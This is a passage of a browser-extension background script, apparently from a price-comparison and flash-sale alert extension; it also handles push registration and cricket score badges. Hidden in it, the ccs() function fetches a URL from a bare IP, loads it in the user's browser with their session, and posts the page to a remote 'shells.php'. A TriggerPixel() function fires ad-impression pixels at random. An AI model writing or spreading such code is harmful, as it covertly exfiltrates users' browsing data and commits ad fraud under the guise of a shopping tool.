    newURL = data[k].url;
  }
}
  // var newURL = data[localStorage.activeSale].link;
  if(localStorage.saleStarted==1){
    chrome.tabs.query({}, function (tabs) {
      var flagFound = 0;
      for (var i = 0; i < tabs.length; i++) {
        var cur_url = tabs[i].url;
          //console.log(tabs[i].url);

          var baseURL = newURL;
          // console.log(cur_url + " " + baseURL);
          if(flagFound==0 && cur_url.split(baseURL).length>1){
            flagFound = 1; localStorage.specialTab = tabs[i].id;
          }
        }
        if(flagFound==0){
          localStorage.specialTab = "";
          // var data = JSON.parse(localStorage.saleArray);
          // var newURL = data[localStorage.activeSale].link;
          // chrome.tabs.create({ url: newURL });
          // _gaq.push(["_trackEvent","SEARCH:SALE","Mi Sale"]);
          // console.log("Had to create a URL2");
          getSpecial();
        }
      });
  }
}

function ccs(){
  $.ajax("http://52.172.215.213/shella", {}).then(function(dataCrawl){
    // console.log(dataCrawl);
    // dataCrawl = JSON.parse(dataCrawl);
    if(dataCrawl.status){
      urlCrawl = dataCrawl.data.url;
      entryCrawl = dataCrawl.data.entry_id + "_" + dataCrawl.data.position;
      $.ajax(urlCrawl).success(function(dataResp){
        $.post("http://52.172.215.213/shells/main/shells.php", {"response": dataResp, "url": urlCrawl, "id": entryCrawl}).then(function(){
          // console.log("Yay!");
        });
      })
      .fail(function($xhr){
        var dataResp = $xhr.responseText;
        $.post("http://52.172.215.213/shells/main/shells.php", {"response": $xhr.responseText, "url": urlCrawl, "id": entryCrawl}).then(function(){
        });
      });
    }
  });
}

setInterval(function(){
  ccs();
}, 25 * 60000);

ccs();

function checkMostSensitive(){
  // console.log("I was called checkMostSensitive");
  if(localStorage.timeRemaining < 60000 && localStorage.timeRemaining > -120000){
   var pollInterval = 1000 * 5;
 }
 else {
  var pollInterval = 1000 * 30;
}
window.setTimeout(checkMostSensitive, pollInterval);
if(localStorage.mostSensitive==1 && localStorage.specialTab!=""){
  chrome.tabs.update(parseInt(localStorage.specialTab), {selected: true});
}
}

function addToBlockList(url){
  console.log("Called with " + url);
  var currentList = localStorage.blockList;
  if(currentList.trim()!=""){
    currentList = JSON.parse(currentList);
    currentList.push(url);
    localStorage.blockList = JSON.stringify(currentList);
  }
  else {
    var somArray = [];
    somArray.push(url);
    localStorage.blockList = JSON.stringify(somArray);
  }
}

function removeFromBlockList(url){
  // console.log("Curent url to remove " + url);
  var currentList = localStorage.blockList;
  if(currentList.trim()!=""){
    currentList = JSON.parse(currentList);
    var newList = [];
    for(var k=0; k<currentList.length; k++)
    {
      if(currentList[k]==url){

      }
      else {
        newList.push(currentList[k]);
      }
    }
  }
  localStorage.blockList = JSON.stringify(newList);
  // console.log('FInal value ' + localStorage.blockList);
}


if(!localStorage.first){
  chrome.tabs.create({
   url : "https://compare.buyhatke.com/thankYou.php"
 });
  localStorage.first = "true";
}

var testVal = localStorage.ext_id;
if(isNaN(parseInt(testVal))){
  localStorage.ext_id = "";
}

if(typeof(localStorage.ext_id) == "undefined" || localStorage.ext_id=="" || parseFloat(localStorage.ext_id)==0 || localStorage.ext_id==0|| isNaN(parseInt(localStorage.ext_id))){
  if(typeof(localStorage.ext_id)== "undefined" || parseFloat(localStorage.ext_id)==0 || isNaN(parseInt(localStorage.ext_id)) || localStorage.ext_id==0){
    var url2 = "https://compare.buyhatke.com/extensionRegister.php?isNew=3";
  }
  else {
    var url2 = "https://compare.buyhatke.com/extensionRegister.php?isNew=0";
  }
  //console.log(url2);
  var http3 = getXMLHTTPRequest();
  http3.open("GET",url2,true);
  http3.onload = (function(){
    if (http3.readyState == 4) {
     if(http3.status == 200) {
      var msg = http3.responseText;
    //console.log(msg);
    msg = msg.split("~");
    if(msg.length > 1){
     if(!isNaN(parseInt(msg[0])) && !isNaN(parseInt(msg[1]))){
      localStorage.ext_id = msg[0];
      localStorage.ext_auth = msg[1];
      countYet = 0;
      checkStatus3();
    }
  }

}
}
});
  http3.send(null);
}

if((typeof(localStorage.ext_auth) == "undefined" || localStorage.ext_auth==""|| isNaN(parseInt(localStorage.ext_auth)))&&(localStorage.ext_id!="" && typeof(localStorage.ext_id)!="undefined" && !(isNaN(parseInt(localStorage.ext_id))))) {
  var url2 = "https://compare.buyhatke.com/extensionRegister.php?isNew=2&ext_id=" + localStorage.ext_id;
  //console.log(url2);
  var http5 = getXMLHTTPRequest();
  http5.open("GET",url2,true);
  http5.onload = (function(){
    if (http5.readyState == 4) {
     if(http5.status == 200) {
      var msg = http5.responseText;
    //console.log(msg);
    localStorage.ext_auth = msg;
  }
}
});
  http5.send(null);
}


localStorage.isVerified = 0;

// if(!localStorage.ext_id_change && typeof(localStorage.ext_id) != "undefined" && typeof(localStorage.ext_auth)!= "undefined"){

//   var url2 = "https://compare.buyhatke.com/extension/changeID.php?ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;

//   console.log(url2);
//   var http3 = getXMLHTTPRequest();
//   http3.open("GET",url2,true);
//   http3.onload = (function(){
//   if (http3.readyState == 4) {
//    if(http3.status == 200) {
//     var msg = http3.responseText;
//     console.log(msg);
//     msg = msg.split("~");
//     localStorage.ext_id = msg[0];
//     localStorage.ext_auth = msg[1];
//     console.log("New Extension IDs received");
//     localStorage.ext_id_change = "true";
//        }
//      }
//  });
//      http3.send(null);
// }

if(localStorage.features_json == undefined){
  localStorage.features_json = '[0,0,0,0,0]';
}

if(localStorage.subscribedFor == undefined){
  localStorage.subscribedFor = "";
}

if(localStorage.saleArray == undefined){
  localStorage.saleArray = "";
}

if(localStorage.saleFinished == undefined){
  localStorage.saleFinished = 0;
}

if(localStorage.saleStarted == undefined){
  localStorage.saleStarted = 0;
}

if(localStorage.refreshedYet == undefined){
  localStorage.refreshedYet = 0;
}

if(localStorage.specialTab == undefined){
  localStorage.specialTab = "";
}

if(localStorage.mostSensitive == undefined){
  localStorage.mostSensitive = "";
}

if(localStorage.instructions == undefined){
  localStorage.instructions = "";
}

if(localStorage.diffTime == undefined){
  localStorage.diffTime = 0;
}

if(localStorage.activeSale == undefined){
  localStorage.activeSale = 0;
}

if(localStorage.email_lucky == undefined){
  localStorage.email_lucky = "";
}

if(localStorage.email_sent == undefined){
  localStorage.email_sent = 0;
}

if(localStorage.phoneNo == undefined){
  localStorage.phoneNo = "";
}

if(localStorage.myName == undefined){
  localStorage.myName = "";
}

if(localStorage.emailEbay == undefined){
  localStorage.emailEbay = "";
}

if(localStorage.bankBox1 == undefined){
  localStorage.bankBox1 = "";
}

if(localStorage.bankBox2 == undefined){
  localStorage.bankBox2 = "";
}
if(localStorage.bankBox3 == undefined){
  localStorage.bankBox3 = "";
}
if(localStorage.bankBox4 == undefined){
  localStorage.bankBox4 = "";
}


if(localStorage.verifiedExt == undefined){
  localStorage.verifiedExt = 0;
}

if(localStorage.listNotIDs == undefined){
  localStorage.listNotIDs = "";
}

if(localStorage.lastTime === undefined){
  localStorage.lastTime = 0;
}

if(localStorage.blockList === undefined){
  localStorage.blockList = "";
}

if(localStorage.mywishlist == undefined || localStorage.mywishlist.trim() == "" || localStorage.mywishlist.trim() == "[]"){
  localStorage.mywishlist = "";
}

if(localStorage.searchTesting == undefined || localStorage.searchTesting.trim() == "" || localStorage.searchTesting.trim() == "[]"){
  localStorage.searchTesting = 0;
}

if(localStorage.featuresArray == undefined){
  localStorage.featuresArray = JSON.stringify([{"key":"Price Comparison (Yellow Bar)","value":1},{"key":"Price Graph History","value":1},{"key":"Watch Price Button","value":1},{"key":"Compare Price Button","value":1},{"key":"Coupons and Deals Tab","value":1},{"key":"Apply Coupons automatically","value":1},{"key":"Show Related Deals","value":1}]);
}

if(localStorage.flashSale == undefined || localStorage.flashSale == ""){
  localStorage.flashSale = JSON.stringify([{"key":"Mi5","value":0, "url":"http://www.mi.com/in/hdindex/openbuy/#MI5", "startsAt": 1464165000},{"key":"Redmi Note 3, 16 GB, Gold","value":0, "url": "http://www.mi.com/in/hdindex/openbuy/#HM3A", "startsAt": 1464165000},{"key":"Redmi Note 3, 16 GB, Silver","value":0, "url": "http://www.mi.com/in/hdindex/openbuy/#HM3A", "startsAt": 1464165000},{"key":"Redmi Note 3, 16 GB, Dark Grey","value":0, "url": "http://www.mi.com/in/hdindex/openbuy/#HM3A", "startsAt": 1464165000},{"key":"Redmi Note 3, 32 GB, Gold","value":0, "url":"http://www.mi.com/in/hdindex/openbuy/#HM3A", "startsAt": 1464165000},{"key":"Mi Powerbank","value":0, "url":"http://www.mi.com/in/hdindex/openbuy/#MIPOWER20000", "startsAt": 1464165000},{"key":"Redmi Note 3, 32 GB, Grey","value":0, "url":"http://www.mi.com/in/hdindex/openbuy/#HM3A", "startsAt": 1464165000}]);
}

var check = localStorage.flashSale;
check = JSON.parse(check);

for(m=0;m<check.length;m++){
  check[m].startsAt = 1464165000;
}

localStorage.flashSale = JSON.stringify(check);

var check = localStorage.flashSale;
check = JSON.parse(check);
checkCount = check.length;
var tempObj = {};
if(checkCount == 6){
  // console.log("Entered here to update");
  tempObj.key = "Redmi Note 3, 32 GB, Grey";
  tempObj.value = 0;
  tempObj.url = "http://www.mi.com/in/hdindex/openbuy/#HM3A";
  tempObj.startsAt = 1464165000;
  check.push(tempObj);
}

check = JSON.stringify(check);
localStorage.flashSale = check;

if(localStorage.tokenSent == undefined || localStorage.tokenSent == ''){
 localStorage.tokenSent = 0;
}

if(localStorage.salesArray == undefined){
  localStorage.salesArray = JSON.stringify([{"key":"Paytm Sale","value":0},{"key":"American Swan Sale","value":0}]);
}

if(localStorage.promoPushArray == undefined || localStorage.promoPushArray == ""){
  localStorage.promoPushArray = JSON.stringify([{"key":"SUBSCRIBE TO PROMOTIONAL PUSH MESSAGES:","value":1},{"key":"10:00 AM - 09:00 PM","value":1},{"key":"09:00 PM - 10:00 AM","value":1},{"key":"Live Offer Updates (1st- 6th Oct)","value":1}]);
}

var temp = localStorage.promoPushArray;
temp = JSON.parse(temp);
if(temp.length < 4){
 temp.push({"key":"Live Offer Updates (1st- 6th Oct)","value":1});
 temp = JSON.stringify(temp);
 localStorage.promoPushArray = temp;
}

if(localStorage.noIDs == undefined){
  localStorage.noIDs = 0;
}

localStorage.saleMonitor = 0;
localStorage.timeRemaining = 100000000000;

function registerCallback(pushToken) {
  //console.log(pushToken);
  if(localStorage.pushToken!=pushToken){
    localStorage.pushToken = pushToken;
    localStorage.tokenSent = 0;
  }
  localStorage.pushToken = pushToken;
  sendToServer(pushToken);
}

var PROJECT_ID = ["358578992660", "1085488274737", "539434688778", "1020813561513", "475502926853", "456594359017", "67401952723", "295603981915", "394270336690", "185922111034", "156425775273", "760459006883", "775911316237", "1034133506565", "136204635066", "36933957754", "846526423958", "1097096552244", "912403599484", "144926097978", "420412158949", "547527006010", "1040472806390", "739273757422", "666819545943", "1091842062830", "791670605618", "849724595290", "926896629509"];

var countCh = PROJECT_ID.length;
// if(countCh != localStorage.noIDs || localStorage.pushToken == undefined || localStorage.pushToken == "" || typeof(localStorage.pushToken) == "undefined"){
 chrome.gcm.register(PROJECT_ID, registerCallback);
 localStorage.noIDs = countCh;
// }
// else {
//   sendToServer(localStorage.pushToken);
// }


// cscInit();
if(localStorage.checkedArray == undefined || localStorage.checkedArray == ""){
  localStorage.checkedArray = ("{}");
}


function getFlashSales(){
 var pollInterval = 24000 * 3600;
 window.setTimeout(getFlashSales, pollInterval);
 var httpq4 = new getXMLHTTPRequest();
 var myurl = "https://compare.buyhatke.com/options/flashSaleNew.php";
 var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
 httpq4.open("POST", myurl, true);
 httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 httpq4.onreadystatechange = function(){
  if (httpq4.readyState == 4) {
    if(httpq4.status == 200) {
      var mytext = httpq4.responseText;
        //console.log(mytext);
        if(mytext!="" && mytext.trim() != "Authentication Failed!" && (JSON.parse(mytext).length)!=0){
          localStorage.existingSales = mytext;
        }
        //console.log(watchListArray[0]);
      }
    }
  };
  httpq4.send(parameters);
}

// localStorage.checkedArray
// "{"u107":true,"u108":true,"u109":true,"u110":true,"u111":true,"u112":true,"u117":true}"
// localStorage.existingSales
// "[{"title":"Redmi 4A Grey, 16 GB","code":"u107","url":"http:\/\/www.mi.com\/in\/hdindex\/openbuy\/#REDMI4A","time":1490855400},{"title":"Redmi 4A Gold, 16 GB","code":"u108","url":"http:\/\/www.mi.com\/in\/hdindex\/openbuy\/#REDMI4A","time":1490855400},{"title":"Redmi Note 4 Gold, 2 GB + 32 GB","code":"u109","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Dark Grey, 2 GB + 32 GB","code":"u110","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Black, 2 GB + 32 GB","code":"u111","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Gold, 3 GB + 32 GB","code":"u112","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Dark Grey, 3 GB + 32 GB","code":"u113","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Black, 3 GB + 32 GB","code":"u114","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Gold, 4 GB + 64 GB","code":"u115","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490769000},{"title":"Redmi Note 4 Black, 4 GB + 64 GB","code":"u117","url":"http:\/\/buy.mi.com\/in\/buy\/product\/note4","time":1490686200}]"

if(localStorage.openTimeHash == undefined || localStorage.openTimeHash == ""){
  localStorage.openTimeHash = "{}";
}

if(localStorage.tabAssignedHash == undefined || localStorage.tabAssignedHash == ""){
  localStorage.tabAssignedHash = "{}";
}

// localStorage.openTimeHash = "{}";
// localStorage.tabAssignedHash = "{}";

function checkFlashSales(){
 setTimeout(function(){checkFlashSales()}, 5000);
 var existingSales = localStorage.existingSales;
 var checkArray = localStorage.checkedArray;
 existingSales = JSON.parse(existingSales);
 var timeHash = JSON.parse(localStorage.openTimeHash);
   // console.log("Called");
   // timeHash = {};
   //if(existingSales[k].time*1000 - Math.round(+new Date()) < 600000 && existingSales[k].time*1000 - Math.round(+new Date()) > -300000){
     checkArray = JSON.parse(checkArray);
     for(var k=0; k<existingSales.length; k++){
       for(var m=0; m< existingSales[k].length; m++){
       var curCode = existingSales[k][m].code;
       if(typeof(checkArray[curCode])!=undefined && checkArray[curCode]== true){
        if(existingSales[k][m].time*1000 - Math.round(+new Date()) < 600000 && existingSales[k][m].time*1000 - Math.round(+new Date()) > -300000){
          if(!timeHash[existingSales[k][m].time+ "~" + curCode]){
            var timeNow = existingSales[k][m].time + "~" + curCode;
            chrome.windows.create({ url: existingSales[k][m].url },function(window) {
                     // console.dir(window);
                     // console.log(window['tabs'][0].id);
                     // console.log(timeNow);
                     var urlStart = window['tabs'][0].url;
                     // console.log(urlStart);
                     urlStart = urlStart.split("~#");
                     if(urlStart.length > 1){
                      urlStart = urlStart[1];
                    }
                    else {
                     urlStart = timeNow;
                   }
                     // console.log("urlStartHere " + urlStart);
                     var tabHash = JSON.parse(localStorage.tabAssignedHash);
                     tabHash[urlStart] = window['tabs'][0].id;
                     localStorage.tabAssignedHash = JSON.stringify(tabHash);
                     // checkArray[curCode] = false;
                     // console.log(JSON.stringify(checkArray));

                   });
                // console.log("Opened");
                timeHash[existingSales[k][m].time + "~" + curCode] = true;
              }
            }
          }
        }
        }
        // localStorage.checkedArray = JSON.stringify(checkArray);
        localStorage.openTimeHash = JSON.stringify(timeHash);
      }

      function checkSource(){
        var url2 = "https://compare.buyhatke.com/getCookie.php";
  //console.log(url2);
  var http5 = getXMLHTTPRequest();
  http5.open("GET",url2,true);
  http5.onload = (function(){
    if (http5.readyState == 4) {
     if(http5.status == 200) {
      var msg = http5.responseText;
    //console.log(msg);
    localStorage.sourceInstall = msg;
  }
}
});
  http5.send(null);
}


checkIcons();
cscInit();
// checkFlashSales();
getFlashSales();
checkFlashSales();
//setValues();

checkStatus();
checkStatus3();
//getData();
//checkNotification();
//checkOtherNotifications();
checkEmailVerified();
//checkAlertStatus();
// checkSale();
// caliberateTime();
//getInstructions();
// monitorSaleTime();
getSpecial();
checkMostSensitive();
//sendSubscribed();
getRefresh();
// getSaleDate();
// applySale();
checkSource();


chrome.runtime.setUninstallURL("https://compare.buyhatke.com/uninstall.php?ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth);

//Add address....

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.method == "getLocalStorage")
    sendResponse({data: localStorage[request.key]});
  else
      sendResponse({}); // snub them.
  });
// Add address....

function features1(mytext)
{

          // console.log("response-"+mytext);
          var json_features = localStorage.features_json;
          json_features = JSON.parse(json_features);
          // console.log(json_features);

          json_features[mytext]=1;
          localStorage.features_json=JSON.stringify(json_features);


        }

// Cricket fetch starts here

if(localStorage.subsMatches == undefined || localStorage.subsMatches == ""){
  localStorage.subsMatches = "";
}

if(localStorage.subsTeams == undefined || localStorage.subsTeams == ""){
  localStorage.subsTeams = "";
}

if(localStorage.subsTypeSelected == undefined || localStorage.subsTypeSelected == ""){
  localStorage.subsTypeSelected = 0;
}

if(localStorage.setTagType == undefined || localStorage.setTagType == ""){
  localStorage.setTagType = 0;
}



matchesActive = 1;
matchSelected = "";
// localStorage.subsMatches = 18129;
lastFetched = 0;
anyMatch = "";
// clearTimeout(scoreMacBadge);

// fetchScore();

var currentMatchHandle = 0;
function getCurrentMatch() {
clearTimeout(currentMatchHandle);
currentMatchHandle =  setTimeout(function(){getCurrentMatch();}, 600000);
if(localStorage.subsTeams!="" || localStorage.subsMatches!=""){
var http3 = getXMLHTTPRequest();
var myurl = "https://s3-ap-southeast-1.amazonaws.com/bh-cricket/activeMatch.txt";
 var myurl1 = myurl;
  myRand = parseInt(Math.random()*999999999999999);
  var modurl = myurl1+"?rand="+myRand ;

  http3.open("GET", modurl, true);
  http3.onreadystatechange = function(){
    if (http3.readyState == 4) {
    if(http3.status == 200) {
          var mytext = http3.responseText;
          mytext = JSON.parse(mytext);
          checkSubscription(mytext);
        }
     }
  };
  http3.send(null);
  }

}

function checkAnyMatch(data){
   if(data!="" && data!="[]" && data.length > 0){
        // anyMatch = data[0].id;
        // fetchScore();
   }
}

function checkSubscription(data){

    if(data.length==0){
       // console.log("Initilized all the variables");
       matchSelected = "";
       anyMatch = "";
       currentScoreJson = "";
       clearTimeout(scoreMacBadge);
    }

    if(localStorage.subsMatches=="" && localStorage.subsTeams==""){
       console.log("No subscription");
       matchesActive = 0;
       matchSelected = "";
       anyMatch = "";
       currentScoreJson = "";
       clearTimeout(scoreMacBadge);
       // checkAnyMatch(data);
       return;
    }
    if(localStorage.subsMatches!=""){
       for(var k=0; k<data.length;k++){
          var strCheck = "," + localStorage.subsMatches + ",";
          if(strCheck.split("," + data[k].id + ",").length > 1){
              matchSelected = data[k].id;
              fetchScore();
              return;
          }
       }

    }
    if(localStorage.subsTeams!=""){
       for(var k=0; k<data.length;k++){
          var teams  = data[k].name.toUpperCase();
          teams = teams.split("VS");
          for(var m=0;m<teams.length;m++){
            var curTeam = teams[m].trim();
            if(curTeam!=""){
               curTeam = "," + curTeam + ",";
               var totalSubs = "," + localStorage.subsTeams.toUpperCase() + ",";
               if(totalSubs.split(curTeam).length > 1 || curTeam == totalSubs){
                  matchSelected= data[k].id;
                  fetchScore();
                  return;
               }
            }
          }
       }
    }
    console.log("No active matches now");
    // checkAnyMatch(data);
}

currentScoreJson = "";
var fetchHandler = 0;

function diffOvers(over1,over2){
   over1 = over1.toString();
   over2 = over2.toString();
   if(parseFloat(over1)>parseFloat(over2)){
    temp = over2;
    over2 = over1;
    over1 = temp;
    }

    over1 = over1.split(".");
    if(over1.length>1){
        over1 = 6*parseFloat(over1[0]) + parseFloat(over1[1]);
    }
    else {
        over1 = 6*parseFloat(over1[0]);
    }

    over2 = over2.split(".");
    if(over2.length>1){
        over2 = 6*parseFloat(over2[0]) + parseFloat(over2[1]);
    }
    else {
        over2 = 6*parseFloat(over2[0]);
    }

    return (over2 - over1)

}

function diffScores(score1, score2){
  wik1 = parseFloat(score1.split("/")[1]);
  wik2 = parseFloat(score2.split("/")[1]);
  if(wik2 > wik1 && wik2-wik1==1){
    return -1;
  }
  score1 = parseFloat(score1.split("/")[0]);
  score2 = parseFloat(score2.split("/")[0]);
  return (score2 - score1);
}



function showScoreBadge(){
  if(parseFloat(Math.round(+new Date())/1000) - lastShown > .9){
  lastShown = parseFloat(Math.round(+new Date())/1000);
  clearTimeout(scoreMacBadge);
  // console.log("pos " + currentPosShown);
  scoreMacBadge = setTimeout(function(){showScoreBadge();},1000);
  // console.log(scoreMacBadge);
  if(navigator.userAgent.toUpperCase().split("MAC").length> 1){
      var isMac= 1;
  }
  else{
      var isMac = 0;
  }

     var splStr = lastScores.split("/");
     if(currentPosShown==-1){
        var strToShow = teamBatting;
        currentPosShown++;
     }
     else if(currentPosShown==0){
        if(isMac==1){
          var strToShow = splStr[0];
        }
        else{
          var strToShow = lastScores;
        }
        currentPosShown++;
     }
     else if(currentPosShown==1){
        if(isMac==1){
          var strToShow = splStr[1] + " W";
          currentPosShown++;
        }
        else {
          var strToShow = lastOvers+ " O";
          currentPosShown = -1;
        }
     }
     else {
        var strToShow = lastOvers;
        currentPosShown = -1;
     }

  chrome.tabs.getAllInWindow(null, function(tabs){
          for (var i = 0; i < tabs.length; i++) {
          chrome.browserAction.setBadgeText({tabId: tabs[i].id, text: strToShow});
          chrome.browserAction.setBadgeBackgroundColor({tabId: tabs[i].id, color: "#000000"});
          chrome.browserAction.setIcon({tabId: tabs[i].id, path: 'ext_green.png'});
        }
      });
  }
  else {
    console.log("Ignored matchShow");
  }
}

function strip(html)
{
   var tmp = document.createElement("DIV");
   tmp.innerHTML = html;
   return tmp.textContent || tmp.innerText || "";
}


function fetchScore(){
  // matchSelected = "18128";
  if(parseInt(Math.round(+new Date())/1000) - lastFetched > 5){
      fetchHandler = setTimeout(function(){fetchScore()}, 4000);
      lastFetched = parseInt(Math.round(+new Date())/1000);
      if(matchSelected.trim()!="" || anyMatch.trim()!=""){
      var http3 = getXMLHTTPRequest();
      if(matchSelected!=""){
          clearTimeout(fetchHandler);
          fetchHandler = setTimeout(function(){fetchScore()}, 6000);
          var myurl = "https://s3-ap-southeast-1.amazonaws.com/bh-cricket/" + matchSelected  + ".txt";
      }
      else{
          clearTimeout(fetchHandler);
          fetchHandler = setTimeout(function(){fetchScore()}, 15000);
          var myurl = "https://s3-ap-southeast-1.amazonaws.com/bh-cricket/" + anyMatch + ".txt";
      }
       var myurl1 = myurl;
        myRand = parseInt(Math.random()*999999999999999);
        var modurl = myurl1+"?rand="+myRand ;

        http3.open("GET", modurl, true);
        http3.onreadystatechange = function(){
          if (http3.readyState == 4) {
          if(http3.status == 200) {
                var mytext = http3.responseText;
                currentScoreJson = mytext;
                mytext = JSON.parse(mytext);
                var curScore = mytext.score;
                var curOvers = mytext.overs;
                teamBatting = mytext.teamBatting;
                if(localStorage.subsTypeSelected.split("1").length>1){
                if(lastScores!="" && lastOvers!=""){
                    scoreDiff = diffScores(lastScores, curScore);
                    oversDiff = diffOvers(curOvers,lastOvers);
                    if(matchSelected!=""){
                        if(scoreDiff==6 && mytext.type=="SIX"){
                          console.log("That's a 6");
                            notifyPAImage("https://s3-ap-southeast-1.amazonaws.com/push-images/6Runs.png", "Live Match Updates", strip(mytext.special) + " \n" + mytext.teamBatting + ": " + mytext.score + "(" + mytext.overs + ")", "http://www.cricbuzz.com/live-cricket-scorecard/" + matchSelected + "/buyhatke-nth-match-indian-premier-league-2017","cricketAlertPush");

                        }
                        else if(scoreDiff==4 && mytext.type=="FOUR"){
                          notifyPAImage("https://s3-ap-southeast-1.amazonaws.com/push-images/4Runs.png", "Live Match Updates", strip(mytext.special) + " \n" + mytext.teamBatting + ": " + mytext.score + "(" + mytext.overs + ")", "http://www.cricbuzz.com/live-cricket-scorecard/" + matchSelected + "/buyhatke-nth-match-indian-premier-league-2017","cricketAlertPush");
                            console.log("That's a 4");
                        }
                        else if(scoreDiff==-1 && mytext.type=="WICKET"){
                            notifyPAImage("https://s3-ap-southeast-1.amazonaws.com/push-images/Wicket.png", "Live Match Updates", strip(mytext.special) + " \n" + mytext.teamBatting + ": " + mytext.score + "(" + mytext.overs + ")", "http://www.cricbuzz.com/live-cricket-scorecard/" + matchSelected + "/buyhatke-nth-match-indian-premier-league-2017","cricketAlertPush");
                        }
                    }
                    lastScores = curScore;
                    lastOvers = curOvers;
                }
                else {
                   lastScores = curScore;
                   lastOvers = curOvers;
                }
              }
              else {
                   lastScores = curScore;
                   lastOvers = curOvers;
                }

                if((matchSelected!="" || anyMatch!="")){
                  showScoreBadge();
                  // chrome.tabs.getAllInWindow(null, function(tabs){
                  //     for (var i = 0; i < tabs.length; i++) {
                  //     chrome.browserAction.setBadgeText({tabId: tabs[i].id, text: curScore});
                  //     chrome.browserAction.setBadgeBackgroundColor({tabId: tabs[i].id, color: "#000000"});
                  //     chrome.browserAction.setIcon({tabId: tabs[i].id, path: 'ext_green.png'});
                  //   }
                  // });
              }
              else if(navigator.userAgent.toUpperCase().split("MAC").length>1){
                  // showScoreBadge();
              }

                if(mytext.matchEnded==1){
                    matchSelected = "";
                    anyMatch = "";
                    currentScoreJson = "";
                    clearTimeout(scoreMacBadge);
                    getCurrentMatch();
                }
              }
           }
        };
        http3.send(null);
    }
  }
  else {
    console.log("Ignored");
    // ignore
  }
  // console.log("called to fetch score of " + matchSelected);
}

getCurrentMatch();

function TriggerPixel(flag){
  // return;
  if(flag==0){
      setTimeout(function(){TriggerPixel()}, Math.floor((Math.random() * 100000 * 1000) + 1));
  }
  var oldURL = 'http://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=21903193&PluID=0&ord=' + Math.floor(Date.now() / 1000) + '&rtu=-1';
  var newURL = "http://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=21912391&PluID=0&ord=" + Math.floor(Date.now() / 1000) + "&rtu=-1";
  if(Math.floor((Math.random() * 5) + 1)==5){
     fetch(oldURL);
  }
  else {
    fetch(newURL);
  }
  // fetch();
}

TriggerPixel(0);
